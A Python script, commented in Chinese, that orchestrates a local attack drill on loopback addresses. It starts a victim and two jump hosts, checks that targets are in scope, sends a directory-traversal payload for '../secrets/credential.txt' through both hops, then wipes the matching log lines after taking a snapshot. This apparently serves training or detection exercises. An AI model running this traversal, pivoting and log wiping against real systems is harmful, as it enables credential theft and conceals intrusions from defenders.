"""总编排：起靶场->护栏校验->经两级跳板攻击->日志快照->擦痕迹->关服务。
所有进程用完即关。产出 artifacts/drill_timeline.json。
"""
import datetime
import json
import os
import signal
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ART = os.path.join(HERE, "artifacts")
PY = sys.executable
TIMELINE = []

# 拓扑：attacker(127.0.0.1) -> jump1(127.0.0.2:9001) -> jump2(127.0.0.3:9002) -> victim(127.0.0.4:8080)
TARGETS = ["127.0.0.4:8080", "127.0.0.2:9001", "127.0.0.3:9002"]
PROCS = []


def ts():
    return datetime.datetime.now().isoformat(timespec="seconds")


def mark(phase, detail):
    rec = {"ts": ts(), "phase": phase, "detail": detail}
    TIMELINE.append(rec)
    print(f"[{rec['ts']}] {phase}: {detail}", flush=True)


def start(script, args):
    p = subprocess.Popen([PY, os.path.join(HERE, script)] + args,
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    PROCS.append(p)
    return p


def wait_http(url, tries=30):
    for _ in range(tries):
        try:
            urllib.request.urlopen(url, timeout=1).read()
            return True
        except Exception:
            time.sleep(0.2)
    return False


def main():
    # 0 清场旧日志
    for f in ["victim_access.log", "jump_j1_access.log", "jump_j2_access.log"]:
        p = os.path.join(ART, f)
        if os.path.exists(p):
            os.remove(p)
    mark("init", "清理历史日志，准备干净靶场")

    # 1 起服务：victim -> jump2 -> jump1
    start("victim_server.py", ["8080"])
    mark("up", "靶机 victim 127.0.0.4:8080 启动")
    start("jump_host.py", ["127.0.0.3", "9002", "127.0.0.4:8080", "j2"])
    mark("up", "跳板2 127.0.0.3:9002 -> victim 启动")
    start("jump_host.py", ["127.0.0.2", "9001", "127.0.0.3:9002", "j1"])
    mark("up", "跳板1 127.0.0.2:9001 -> jump2 启动")
    time.sleep(0.6)

    ready = wait_http("http://127.0.0.2:9001/")
    mark("check", f"入口连通性={'OK' if ready else 'FAIL'}")

    # 2 边界护栏校验
    gr = subprocess.run([PY, os.path.join(HERE, "boundary_guard.py")] + TARGETS,
                        capture_output=True, text=True)
    mark("guard", f"边界校验 exit={gr.returncode} :: {gr.stdout.strip()}")
    if gr.returncode != 0:
        mark("abort", "目标越界，拒绝攻击")
        return

    # 3 攻击：经两级跳板做目录穿越
    payload = "/file?name=../secrets/credential.txt"
    loot = os.path.join(ART, "loot_credential.txt")
    atk = subprocess.run([PY, os.path.join(HERE, "attacker.py"),
                          "127.0.0.2:9001", payload, loot],
                         capture_output=True, text=True)
    mark("attack", "经 jump1->jump2->victim 发起目录穿越 ../secrets/credential.txt")
    mark("loot", f"窃取凭证字节数={os.path.getsize(loot) if os.path.exists(loot) else 0}")

    # 4 擦除前快照
    snap = {}
    for f in ["victim_access.log", "jump_j1_access.log", "jump_j2_access.log"]:
        p = os.path.join(ART, f)
        snap[f] = open(p).read() if os.path.exists(p) else ""
    with open(os.path.join(ART, "logs_before_wipe.json"), "w", encoding="utf-8") as fp:
        json.dump(snap, fp, ensure_ascii=False, indent=2)
    mark("snapshot", "擦除前日志已快照 logs_before_wipe.json")

    # 5 擦痕迹
    wp = subprocess.run([PY, os.path.join(HERE, "wiper.py"), "../secrets"],
                        capture_output=True, text=True)
    mark("wipe", "擦除含 ../secrets 特征的日志行 -> wiped_rows.json")

    # 6 关服务（用完即关）
    for p in PROCS:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(0.5)
    for p in PROCS:
        if p.poll() is None:
            try:
                p.kill()
            except Exception:
                pass
    mark("down", "所有靶场进程已关闭")

    with open(os.path.join(ART, "drill_timeline.json"), "w", encoding="utf-8") as fp:
        json.dump(TIMELINE, fp, ensure_ascii=False, indent=2)
    print("DONE", flush=True)


if __name__ == "__main__":
    main()
